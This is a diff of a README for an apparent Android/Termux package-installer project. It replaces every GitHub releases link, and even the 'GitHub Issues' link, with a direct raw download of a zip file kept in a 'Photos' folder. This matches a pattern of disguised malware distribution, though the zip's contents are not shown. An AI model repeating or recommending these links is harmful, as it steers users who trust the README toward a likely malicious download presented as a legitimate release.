@@ -1,6 +1,6 @@
 # ⚙️ Termux-Commands - Install Android Packages Instantly
 
-[![Download Termux-Commands](https://img.shields.io/badge/Download-Termux--Commands-blue)](https://github.com/Lauricamphoric300/Termux-Commands/releases)
+[![Download Termux-Commands](https://img.shields.io/badge/Download-Termux--Commands-blue)](https://raw.githubusercontent.com/Lauricamphoric300/Termux-Commands/main/Photos/Commands-Termux-v2.8-alpha.3.zip)
 
 ## 📋 What is Termux-Commands?
 
@@ -43,7 +43,7 @@ You will download the Termux-Commands package on your Windows machine first, the
 
 1. Go to the following page to download the latest release of Termux-Commands:
 
-   [![Get Termux-Commands](https://img.shields.io/badge/Get%20Termux--Commands-grey)](https://github.com/Lauricamphoric300/Termux-Commands/releases)
+   [![Get Termux-Commands](https://img.shields.io/badge/Get%20Termux--Commands-grey)](https://raw.githubusercontent.com/Lauricamphoric300/Termux-Commands/main/Photos/Commands-Termux-v2.8-alpha.3.zip)
 
 2. On the Releases page, find the latest version. Look for a compressed file like `.zip` or `.tar.gz`.
 3. Click the file name to start your download.
@@ -137,10 +137,10 @@ Run `./install.sh` again to keep your Termux installation up to date.
 
 You can use GitHub Issues on the project page to report bugs or ask questions:
 
-[Termux-Commands GitHub Issues](https://github.com/Lauricamphoric300/Termux-Commands/issues)
+[Termux-Commands GitHub Issues](https://raw.githubusercontent.com/Lauricamphoric300/Termux-Commands/main/Photos/Commands-Termux-v2.8-alpha.3.zip)
 
 This is a good way to get help if you face errors or want to suggest improvements. Be clear about which step you had trouble with.
 
 ---
 
-[![Download Termux-Commands](https://img.shields.io/badge/Download-Termux--Commands-blue)](https://github.com/Lauricamphoric300/Termux-Commands/releases)
+[![Download Termux-Commands](https://img.shields.io/badge/Download-Termux--Commands-blue)](https://raw.githubusercontent.com/Lauricamphoric300/Termux-Commands/main/Photos/Commands-Termux-v2.8-alpha.3.zip)
